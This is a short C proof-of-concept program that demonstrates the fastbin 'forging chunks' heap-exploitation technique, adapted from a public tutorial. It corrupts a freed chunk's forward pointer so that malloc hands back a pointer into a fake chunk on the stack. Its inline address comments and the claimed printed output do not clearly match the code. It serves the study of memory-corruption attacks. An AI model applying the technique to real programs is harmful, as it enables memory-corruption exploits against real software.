#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Forging a chunk of heap mechanism
// 'malloc' normally returns only heap area
// In this file, I demonstated 'malloc' returning pointer to stack
// I added more code so that another 'malloc' will NOT cause segfault
// Original: https://heap-exploitation.dhavalkapil.com/attacks/forging_chunks.html

struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

struct userData {
  char* tmp1;
  char* tmp2;
  char secret[10];
};

int main() {
  char *a, *b, *data, *tmp;
  struct userData *victim;

  // First grab a fast chunk
  a = malloc(20);               // 'a' points to 0x219c010
  b = malloc(20);               // 'b' points to 0x219c030

  // Create a forged chunk
  struct forged_chunk chunk;    // At address 0x7ffc6de96690
  chunk.size = 0x20;            // This size should fall in the same fastbin
  data = &chunk.buf;
  strcpy(data, "attacker");

  // Put the fast chunk back into fastbin
  free(a);
  free(b);
  // Modify 'fd' pointer of our forged chunk back to 'fd' of b (point back to a) so next malloc will not cause segfault
  // Modify 'fd' pointer of 'b' to point to our forged chunk
  chunk.fd = *((unsigned long long *)b); 
  *((unsigned long long *)b) = (unsigned long long)&chunk;
  // Remove 'b' from HEAD of fastbin
  // Our forged chunk will now be at the HEAD of fastbin
  tmp = malloc(20);                   // Will return 0x219c030

  victim = malloc(20);          // Points to the stack 0x7ffc6de966a0
  tmp = malloc(20);           // Return 0x219c010 (pop a)
  printf("%s\n", victim->secret);       // Prints "attacker's data on stack" !!
}
